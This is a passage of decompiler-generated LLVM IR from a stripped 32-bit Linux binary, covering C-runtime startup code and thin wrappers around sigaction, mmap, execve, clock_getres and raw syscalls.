  %v0_8054132 = phi i32 [ %v1_8054135, %dec_label_pc_8054132 ], [ %v0_805412a, %dec_label_pc_80540cf ]
  %v1_8054132 = inttoptr i32 %v0_8054132 to i32*
  %v2_8054132 = load i32, i32* %v1_8054132, align 4
  %v3_8054132 = icmp eq i32 %v2_8054132, 0
  %v1_8054135 = add i32 %v0_8054132, 4
  %v1_8054138 = icmp eq i1 %v3_8054132, false
  br i1 %v1_8054138, label %dec_label_pc_8054132, label %dec_label_pc_8054159.preheader

dec_label_pc_8054159.preheader:                   ; preds = %dec_label_pc_8054132
  store i32 %v1_8054135, i32* @ebx, align 4
  %v1_80541591 = inttoptr i32 %v1_8054135 to i32*
  %v2_80541592 = load i32, i32* %v1_80541591, align 4
  %v3_80541593 = icmp eq i32 %v2_80541592, 0
  %v1_805415c10 = icmp eq i1 %v3_80541593, false
  br i1 %v1_805415c10, label %dec_label_pc_805413e.lr.ph, label %dec_label_pc_805415e

dec_label_pc_805413e.lr.ph:                       ; preds = %dec_label_pc_8054159.preheader
  %v3_8054116 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8054149 = add i32 %v3_8054116, 32
  br label %dec_label_pc_805413e

dec_label_pc_805413e:                             ; preds = %dec_label_pc_805413e.lr.ph, %dec_label_pc_8054156
  %v1_8054149 = phi i32 [ %v2_80541592, %dec_label_pc_805413e.lr.ph ], [ %v2_8054159, %dec_label_pc_8054156 ]
  %v0_8054148 = phi i32 [ %v1_8054135, %dec_label_pc_805413e.lr.ph ], [ %v1_8054156, %dec_label_pc_8054156 ]
  %v6_8054143 = icmp ugt i32 %v1_8054149, 14
  br i1 %v6_8054143, label %dec_label_pc_8054156, label %dec_label_pc_8054145

dec_label_pc_8054145:                             ; preds = %dec_label_pc_805413e
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_8054148, i32* %stack_var_-168, align 4
  %v2_8054149 = mul i32 %v1_8054149, 8
  %v4_8054149 = add i32 %v3_8054149, %v2_8054149
  %v3_805414e = inttoptr i32 %v4_8054149 to i16*
  %v4_805414e = call i32 @function_8051e5c(i16* %v3_805414e, i32 %v0_8054148, i32 8)
  %v0_8054156.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054156

dec_label_pc_8054156:                             ; preds = %dec_label_pc_805413e, %dec_label_pc_8054145
  %v0_8054156 = phi i32 [ %v0_8054148, %dec_label_pc_805413e ], [ %v0_8054156.pre, %dec_label_pc_8054145 ]
  %v1_8054156 = add i32 %v0_8054156, 8
  store i32 %v1_8054156, i32* @ebx, align 4
  %v1_8054159 = inttoptr i32 %v1_8054156 to i32*
  %v2_8054159 = load i32, i32* %v1_8054159, align 4
  %v3_8054159 = icmp eq i32 %v2_8054159, 0
  %v1_805415c = icmp eq i1 %v3_8054159, false
  br i1 %v1_805415c, label %dec_label_pc_805413e, label %dec_label_pc_805415e

dec_label_pc_805415e:                             ; preds = %dec_label_pc_8054156, %dec_label_pc_8054159.preheader
  store i32 %v2_8054120, i32* @eax, align 4
  %v0_8054162 = call i32 @function_8055ce4()
  store i32 %v0_8054162, i32* @eax, align 4
  %v0_8054167 = call i32 @function_805408f()
  %v1_8054175 = icmp eq i32 %tmp24, 0
  %v3_8054177 = select i1 %v1_8054175, i32 4096, i32 %tmp24
  %v13_805417a = icmp eq i32 %tmp23, -1
  store i32 %v3_8054177, i32* @global_var_8064b10.384, align 16
  %v1_8054184 = icmp eq i1 %v13_805417a, false
  br i1 %v1_8054184, label %dec_label_pc_80541af, label %dec_label_pc_8054186

dec_label_pc_8054186:                             ; preds = %dec_label_pc_805415e
  %v0_8054186 = call i32 @function_80544ec()
  store i32 %v0_8054186, i32* @ebx, align 4
  %v0_805418d = call i32 @function_8050c14()
  %v0_8054192 = load i32, i32* @ebx, align 4
  %v12_8054192 = icmp eq i32 %v0_8054192, %v0_805418d
  %v1_8054194 = icmp eq i1 %v12_8054192, false
  br i1 %v1_8054194, label %dec_label_pc_80541c5, label %dec_label_pc_8054196

dec_label_pc_8054196:                             ; preds = %dec_label_pc_8054186
  %v0_8054196 = call i32 @function_80544b0()
  store i32 %v0_8054196, i32* @ebx, align 4
  %v0_805419d = call i32 @function_8054488()
  %v0_80541a2 = load i32, i32* @ebx, align 4
  %v12_80541a2 = icmp eq i32 %v0_80541a2, %v0_805419d
  %v1_80541a4 = icmp eq i1 %v12_80541a2, false
  br i1 %v1_80541a4, label %dec_label_pc_80541c5, label %dec_label_pc_80541a6.thread

dec_label_pc_80541a6.thread:                      ; preds = %dec_label_pc_8054196
  br label %dec_label_pc_80541ef

dec_label_pc_80541af:                             ; preds = %dec_label_pc_805415e
  %v15_80541af = icmp eq i32 %tmp23, %tmp22
  %v1_80541b3 = icmp eq i1 %v15_80541af, false
  br i1 %v1_80541b3, label %dec_label_pc_80541c5, label %dec_label_pc_80541b5

dec_label_pc_80541b5:                             ; preds = %dec_label_pc_80541af
  br label %dec_label_pc_80541c5

dec_label_pc_80541c5:                             ; preds = %dec_label_pc_80541b5, %dec_label_pc_80541af, %dec_label_pc_8054196, %dec_label_pc_8054186
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_80541cc = call i32 @function_805405b()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_80541db = call i32 @function_805405b()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_80541ea = call i32 @function_805405b()
  br label %dec_label_pc_80541ef

dec_label_pc_80541ef:                             ; preds = %dec_label_pc_80541a6.thread, %dec_label_pc_80541c5
  %v0_80541ef = load i32, i32* @edi, align 4
  %v1_80541ef = inttoptr i32 %v0_80541ef to i32*
  %v2_80541ef = load i32, i32* %v1_80541ef, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.378 to i32), i32 -134602752), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_80541ef, i32* inttoptr (i32 134604920 to i32*), align 8
  store i32 %arg5, i32* @global_var_8064b14.380, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.378 to i32), i32 -134602752), i32 2), i32 0), label %dec_label_pc_8054214, label %dec_label_pc_8054220

dec_label_pc_8054214:                             ; preds = %dec_label_pc_80541ef, %dec_label_pc_8054214
  %v4_805421454 = phi i32 [ %v1_805421b, %dec_label_pc_8054214 ], [ 0, %dec_label_pc_80541ef ]
  %v5_8054214 = mul i32 %v4_805421454, 4
  %v6_8054214 = add i32 %v5_8054214, ptrtoint (i32* @global_var_805e000.378 to i32)
  %v7_8054214 = inttoptr i32 %v6_8054214 to i32*
  %v8_8054214 = load i32, i32* %v7_8054214, align 4
  call void @__pseudo_call(i32 %v8_8054214)
  %v0_805421b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805421b = add i32 %v0_805421b, 1
  store i32 %v1_805421b, i32* %ebx.global-to-local, align 4
  %v1_805421c = load i32, i32* %esi.global-to-local, align 4
  %v7_805421c = icmp ult i32 %v1_805421b, %v1_805421c
  br i1 %v7_805421c, label %dec_label_pc_8054214, label %dec_label_pc_8054220

dec_label_pc_8054220:                             ; preds = %dec_label_pc_8054214, %dec_label_pc_80541ef
  store i32 134562342, i32* %stack_var_-164, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.378 to i32), i32 -134602752), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.378 to i32), i32 -134602752), i32 2), i32 0), label %dec_label_pc_8054238, label %dec_label_pc_8054244

dec_label_pc_8054238:                             ; preds = %dec_label_pc_8054220, %dec_label_pc_8054238
  %v4_805423844 = phi i32 [ %v1_805423f, %dec_label_pc_8054238 ], [ 0, %dec_label_pc_8054220 ]
  store i32 ptrtoint (i32* @global_var_805423f.388 to i32), i32* %stack_var_-164, align 4
  %v5_8054238 = mul i32 %v4_805423844, 4
  %v6_8054238 = add i32 %v5_8054238, ptrtoint (i32* @global_var_805e000.378 to i32)
  %v7_8054238 = inttoptr i32 %v6_8054238 to i32*
  %v8_8054238 = load i32, i32* %v7_8054238, align 4
  call void @__pseudo_call(i32 %v8_8054238)
  %v0_805423f = load i32, i32* @ebx, align 4
  %v1_805423f = add i32 %v0_805423f, 1
  store i32 %v1_805423f, i32* @ebx, align 4
  %v1_8054240.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8054240 = icmp ult i32 %v1_805423f, %v1_8054240.pre
  br i1 %v7_8054240, label %dec_label_pc_8054238, label %dec_label_pc_8054244

dec_label_pc_8054244:                             ; preds = %dec_label_pc_8054238, %dec_label_pc_8054220
  %v0_805424d = load i32, i32* %stack_var_-164, align 4
  %v1_805424d = call i32 @function_8050f90(i32 %v0_805424d)
  %v1_8054252 = inttoptr i32 %v1_805424d to i32*
  store i32 0, i32* %v1_8054252, align 4
  %v0_8054261 = call i32 @function_8054608()
  store i32 %v0_8054261, i32* @eax, align 4
  %v1_8054266 = inttoptr i32 %v0_8054261 to i32*
  store i32 0, i32* %v1_8054266, align 4
  %v0_805426c = load i32, i32* @eax, align 4
  store i32 %v0_805426c, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_80540d0)
  %v0_8054282 = load i32, i32* @eax, align 4
  %v1_8054285 = call i32 @function_8053c70(i32 %v0_8054282)
  %v0_8054291 = load i32, i32* @ebx, align 4
  %v1_8054291 = inttoptr i32 %v0_8054291 to %sigcontext*
  %v2_8054291 = call i32 @sigreturn(%sigcontext* %v1_8054291)
  %v0_8054299 = load i32, i32* @ebx, align 4
  %v1_8054299 = inttoptr i32 %v0_8054299 to %sigcontext*
  %v2_8054299 = call i32 @sigreturn(%sigcontext* %v1_8054299)
  ret i32 %v2_8054299

; uselistorder directives
  uselistorder i32 %v1_805423f, { 1, 2, 0 }
  uselistorder i32 %v1_805421b, { 1, 2, 0 }
  uselistorder i32 %v2_8054159, { 1, 0 }
  uselistorder i32 %v1_8054156, { 2, 1, 0 }
  uselistorder i32 %v1_8054135, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054132, { 1, 0 }
  uselistorder i32 %v1_8054109, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.378 to i32), i32 -134602752), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e000.378 to i32), i32 -134602752), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @function_805405b, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8054238, { 1, 0 }
  uselistorder label %dec_label_pc_8054214, { 1, 0 }
  uselistorder label %dec_label_pc_80541ef, { 1, 0 }
  uselistorder label %dec_label_pc_8054156, { 1, 0 }
  uselistorder label %dec_label_pc_805413e, { 1, 0 }
}

define i32 @function_805429b(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805429b:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805429b = load i32, i32* @esi, align 4
  %v0_805429c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80542b1 = icmp eq i32* %arg2, null
  br i1 %v1_80542b1, label %dec_label_pc_8054305, label %dec_label_pc_80542b5

dec_label_pc_80542b5:                             ; preds = %dec_label_pc_805429b
  %v2_80542b5 = load i32, i32* %arg2, align 4
  store i32 %v2_80542b5, i32* %stack_var_-148, align 4
  %v1_80542be = add i32 %tmp11, 4
  %v3_80542d0 = bitcast i32* %stack_var_-136 to i16*
  %v4_80542d0 = call i32 @function_8051e5c(i16* %v3_80542d0, i32 %v1_80542be, i32 128)
  br label %dec_label_pc_8054305

dec_label_pc_8054305:                             ; preds = %dec_label_pc_805429b, %dec_label_pc_80542b5
  %v1_8054307 = icmp eq i32 %arg3, 0
  br i1 %v1_8054307, label %dec_label_pc_805430f, label %dec_label_pc_805430b

dec_label_pc_805430b:                             ; preds = %dec_label_pc_8054305
  %v2_805430b = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_805430f

dec_label_pc_805430f:                             ; preds = %dec_label_pc_8054305, %dec_label_pc_805430b
  %v0_805431e = phi i32 [ 0, %dec_label_pc_8054305 ], [ %v2_805430b, %dec_label_pc_805430b ]
  br i1 %v1_80542b1, label %dec_label_pc_805431c, label %dec_label_pc_8054315

dec_label_pc_8054315:                             ; preds = %dec_label_pc_805430f
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805431c

dec_label_pc_805431c:                             ; preds = %dec_label_pc_805430f, %dec_label_pc_8054315
  %v0_805431f = phi %sigaction* [ null, %dec_label_pc_805430f ], [ %phitmp, %dec_label_pc_8054315 ]
  %v5_8054327 = call i32 @function_80543e0(i32 %arg1, %sigaction* %v0_805431f, i32 %v0_805431e, i32 8)
  store i32 %v5_8054327, i32* %ebx.global-to-local, align 4
  br i1 %v1_8054307, label %dec_label_pc_805436a, label %dec_label_pc_8054335

dec_label_pc_8054335:                             ; preds = %dec_label_pc_805431c
  %v2_8054335 = icmp slt i32 %v5_8054327, 0
  br i1 %v2_8054335, label %dec_label_pc_805436a, label %dec_label_pc_8054339

dec_label_pc_8054339:                             ; preds = %dec_label_pc_8054335
  %v3_8054339 = load i32, i32* %stack_var_-288, align 4
  %v2_805433d = inttoptr i32 %arg3 to i32*
  store i32 %v3_8054339, i32* %v2_805433d, align 4
  %v2_8054345 = ptrtoint i32* %stack_var_-276 to i32
  %v1_805434a = add i32 %arg3, 4
  %v3_805434e = inttoptr i32 %v1_805434a to i16*
  %v4_805434e = call i32 @function_8051e5c(i16* %v3_805434e, i32 %v2_8054345, i32 128)
  %v2_8054357 = add i32 %arg3, 132
  %v3_8054357 = inttoptr i32 %v2_8054357 to i32*
  %v2_8054364 = add i32 %arg3, 136
  %v3_8054364 = inttoptr i32 %v2_8054364 to i32*
  %v0_8054370.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805436a

dec_label_pc_805436a:                             ; preds = %dec_label_pc_8054335, %dec_label_pc_805431c, %dec_label_pc_8054339
  %v0_8054370 = phi i32 [ %v5_8054327, %dec_label_pc_8054335 ], [ %v5_8054327, %dec_label_pc_805431c ], [ %v0_8054370.pre, %dec_label_pc_8054339 ]
  store i32 %v0_805429c, i32* @ebx, align 4
  store i32 %v0_805429b, i32* @esi, align 4
  ret i32 %v0_8054370

; uselistorder directives
  uselistorder i1 %v1_8054307, { 1, 0 }
  uselistorder i1 %v1_80542b1, { 1, 0 }
  uselistorder i32* null, { 0, 3, 4, 1, 2 }
  uselistorder i32 %arg3, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_805436a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805431c, { 1, 0 }
  uselistorder label %dec_label_pc_805430f, { 1, 0 }
  uselistorder label %dec_label_pc_8054305, { 1, 0 }
}

define i32 @function_8054378() local_unnamed_addr {
dec_label_pc_8054378:
  %v0_805437b = load i32, i32* @eax, align 4
  %v1_805437d = sub i32 0, %v0_805437b
  %v1_805437f = call i32 @function_8050f90(i32 ptrtoint (i32* @0 to i32))
  %v2_8054384 = inttoptr i32 %v1_805437f to i32*
  store i32 %v1_805437d, i32* %v2_8054384, align 4
  ret i32 -1
}

define i32 @function_8054390(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8054390:
  %stack_var_4 = alloca i32, align 4
  %v0_8054390 = load i32, i32* @ebx, align 4
  store i32 %v0_8054390, i32* @edx, align 4
  %v2_805439b = load i32, i32* @ecx, align 4
  %v4_805439b = load i32, i32* @esi, align 4
  %v5_805439b = load i32, i32* @edi, align 4
  %v6_805439b = load i32, i32* @ebp, align 4
  %v7_805439b = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_805439b, i32 %v0_8054390, i32 %v4_805439b, i32 %v5_805439b, i32 %v6_805439b)
  %v8_805439b = ptrtoint i32* %v7_805439b to i32
  store i32 %v0_8054390, i32* @ebx, align 4
  %tmp = icmp ugt i32* %v7_805439b, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %tmp, i32 134562680)
  ret i32 %v8_805439b

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134562680, { 1, 0 }
}

define i32 @function_80543ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80543ac:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80543ac = load i32, i32* @ebx, align 4
  store i32 %v0_80543ac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_80543bf = call i32 @int80_syscall(i32 102)
  store i32 %v1_80543bf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80543bf, -4095
  br i1 %tmp, label %dec_label_pc_80543d8, label %dec_label_pc_80543cc

dec_label_pc_80543cc:                             ; preds = %dec_label_pc_80543ac
  %v0_80543cc = load i32, i32* %stack_var_-4, align 4
  %v1_80543cc = call i32 @function_8050f90(i32 %v0_80543cc)
  %v0_80543d1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80543d1 = sub i32 0, %v0_80543d1
  %v2_80543d3 = inttoptr i32 %v1_80543cc to i32*
  store i32 %v1_80543d1, i32* %v2_80543d3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80543d8

dec_label_pc_80543d8:                             ; preds = %dec_label_pc_80543ac, %dec_label_pc_80543cc
  %v0_80543d9 = phi i32 [ %v1_80543bf, %dec_label_pc_80543ac ], [ -1, %dec_label_pc_80543cc ]
  %v2_80543d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80543d8, i32* @edx, align 4
  %v2_80543dc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80543dc, i32* @ebx, align 4
  ret i32 %v0_80543d9

; uselistorder directives
  uselistorder i32 %v1_80543bf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80543d8, { 1, 0 }
}

define i32 @function_80543e0(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80543e0:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80543e1 = load i32, i32* @esi, align 4
  store i32 %v0_80543e1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80543f5 = load i32, i32* @ebx, align 4
  %v7_80543fd = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_80543fd, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_80543fd, -4095
  br i1 %tmp, label %dec_label_pc_8054415, label %dec_label_pc_8054409

dec_label_pc_8054409:                             ; preds = %dec_label_pc_80543e0
  %v1_8054409 = call i32 @function_8050f90(i32 %v0_80543f5)
  %v0_805440e = load i32, i32* %esi.global-to-local, align 4
  %v1_805440e = sub i32 0, %v0_805440e
  %v2_8054410 = inttoptr i32 %v1_8054409 to i32*
  store i32 %v1_805440e, i32* %v2_8054410, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054415

dec_label_pc_8054415:                             ; preds = %dec_label_pc_80543e0, %dec_label_pc_8054409
  %v0_8054416 = phi i32 [ %v7_80543fd, %dec_label_pc_80543e0 ], [ -1, %dec_label_pc_8054409 ]
  %v2_8054415 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054415, i32* @edx, align 4
  %v2_8054418 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054418, i32* @esi, align 4
  ret i32 %v0_8054416

; uselistorder directives
  uselistorder i32 %v7_80543fd, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054415, { 1, 0 }
}

define i32 @function_805441c(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805441c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805441c = load i32, i32* @ebx, align 4
  store i32 %v0_805441c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805442f = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_805442f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805442f, -4095
  br i1 %tmp, label %dec_label_pc_8054448, label %dec_label_pc_805443c

dec_label_pc_805443c:                             ; preds = %dec_label_pc_805441c
  %v0_805443c = load i32, i32* %stack_var_-4, align 4
  %v1_805443c = call i32 @function_8050f90(i32 %v0_805443c)
  %v0_8054441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054441 = sub i32 0, %v0_8054441
  %v2_8054443 = inttoptr i32 %v1_805443c to i32*
  store i32 %v1_8054441, i32* %v2_8054443, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054448

dec_label_pc_8054448:                             ; preds = %dec_label_pc_805441c, %dec_label_pc_805443c
  %v0_8054449 = phi i32 [ %v4_805442f, %dec_label_pc_805441c ], [ -1, %dec_label_pc_805443c ]
  %v2_8054448 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054448, i32* @edx, align 4
  %v2_805444c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805444c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054449

; uselistorder directives
  uselistorder i32 %v4_805442f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054448, { 1, 0 }
}

define i32 @function_8054450(i8* %arg1) local_unnamed_addr {
dec_label_pc_8054450:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_4()
  %tmp5 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-4 = alloca i32, align 4
  %v0_8054450 = load i32, i32* @edi, align 4
  store i32 %v0_8054450, i32* %stack_var_-4, align 4
  %v4_8054454 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054454, i32* %edi.global-to-local, align 4
  %v0_8054460 = load i32, i32* @ebx, align 4
  %v5_8054468 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8054468 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8054468 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8054468, [1 x i8*] %v8_8054468)
  store i32 %v9_8054468, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8054468, -4095
  br i1 %tmp12, label %dec_label_pc_8054480, label %dec_label_pc_8054474

dec_label_pc_8054474:                             ; preds = %dec_label_pc_8054450
  %v1_8054474 = call i32 @function_8050f90(i32 %v0_8054460)
  %v0_8054479 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054479 = sub i32 0, %v0_8054479
  %v2_805447b = inttoptr i32 %v1_8054474 to i32*
  store i32 %v1_8054479, i32* %v2_805447b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054480

dec_label_pc_8054480:                             ; preds = %dec_label_pc_8054450, %dec_label_pc_8054474
  %v0_8054481 = phi i32 [ %v9_8054468, %dec_label_pc_8054450 ], [ -1, %dec_label_pc_8054474 ]
  %v2_8054484 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054484, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054481

; uselistorder directives
  uselistorder i32 %v9_8054468, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054480, { 1, 0 }
}

define i32 @function_8054488() local_unnamed_addr {
dec_label_pc_8054488:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054488 = load i32, i32* @ebx, align 4
  store i32 %v0_8054488, i32* %stack_var_-4, align 4
  %v1_8054491 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8054491, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8054491, -4095
  br i1 %tmp, label %dec_label_pc_80544a8, label %dec_label_pc_805449c

dec_label_pc_805449c:                             ; preds = %dec_label_pc_8054488
  %v0_805449c = load i32, i32* %stack_var_-4, align 4
  %v1_805449c = call i32 @function_8050f90(i32 %v0_805449c)
  %v0_80544a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80544a1 = sub i32 0, %v0_80544a1
  %v2_80544a3 = inttoptr i32 %v1_805449c to i32*
  store i32 %v1_80544a1, i32* %v2_80544a3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80544a8

dec_label_pc_80544a8:                             ; preds = %dec_label_pc_8054488, %dec_label_pc_805449c
  %v0_80544a9 = phi i32 [ %v1_8054491, %dec_label_pc_8054488 ], [ -1, %dec_label_pc_805449c ]
  %v2_80544ac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80544ac, i32* @ebx, align 4
  ret i32 %v0_80544a9

; uselistorder directives
  uselistorder i32 %v1_8054491, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 202, { 1, 0 }
  uselistorder label %dec_label_pc_80544a8, { 1, 0 }
}

define i32 @function_80544b0() local_unnamed_addr {
dec_label_pc_80544b0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80544b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80544b0, i32* %stack_var_-4, align 4
  %v1_80544b9 = call i32 @int80_syscall(i32 200)
  store i32 %v1_80544b9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80544b9, -4095
  br i1 %tmp, label %dec_label_pc_80544d0, label %dec_label_pc_80544c4

dec_label_pc_80544c4:                             ; preds = %dec_label_pc_80544b0
  %v0_80544c4 = load i32, i32* %stack_var_-4, align 4
  %v1_80544c4 = call i32 @function_8050f90(i32 %v0_80544c4)
  %v0_80544c9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80544c9 = sub i32 0, %v0_80544c9
  %v2_80544cb = inttoptr i32 %v1_80544c4 to i32*
  store i32 %v1_80544c9, i32* %v2_80544cb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80544d0

dec_label_pc_80544d0:                             ; preds = %dec_label_pc_80544b0, %dec_label_pc_80544c4
  %v0_80544d1 = phi i32 [ %v1_80544b9, %dec_label_pc_80544b0 ], [ -1, %dec_label_pc_80544c4 ]
  %v2_80544d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80544d4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80544d1

; uselistorder directives
  uselistorder i32 %v1_80544b9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80544d0, { 1, 0 }
}

define i32 @function_80544d8() local_unnamed_addr {
dec_label_pc_80544d8:
  %v0_80544d8 = load i32, i32* @global_var_8064b10.384, align 16
  store i32 %v0_80544d8, i32* @edx, align 4
  %v1_80544e3 = icmp eq i32 %v0_80544d8, 0
  %v1_80544e5 = icmp eq i1 %v1_80544e3, false
  %v4_80544e5 = select i1 %v1_80544e5, i32 %v0_80544d8, i32 4096
  ret i32 %v4_80544e5
}

define i32 @function_80544ec() local_unnamed_addr {
dec_label_pc_80544ec:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80544ec = load i32, i32* @ebx, align 4
  store i32 %v0_80544ec, i32* %stack_var_-4, align 4
  %v1_80544f5 = call i32 @int80_syscall(i32 199)
  store i32 %v1_80544f5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80544f5, -4095
  br i1 %tmp, label %dec_label_pc_805450c, label %dec_label_pc_8054500

dec_label_pc_8054500:                             ; preds = %dec_label_pc_80544ec
  %v0_8054500 = load i32, i32* %stack_var_-4, align 4
  %v1_8054500 = call i32 @function_8050f90(i32 %v0_8054500)
  %v0_8054505 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054505 = sub i32 0, %v0_8054505
  %v2_8054507 = inttoptr i32 %v1_8054500 to i32*
  store i32 %v1_8054505, i32* %v2_8054507, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805450c

dec_label_pc_805450c:                             ; preds = %dec_label_pc_80544ec, %dec_label_pc_8054500
  %v0_805450d = phi i32 [ %v1_80544f5, %dec_label_pc_80544ec ], [ -1, %dec_label_pc_8054500 ]
  %v2_8054510 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054510, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805450d

; uselistorder directives
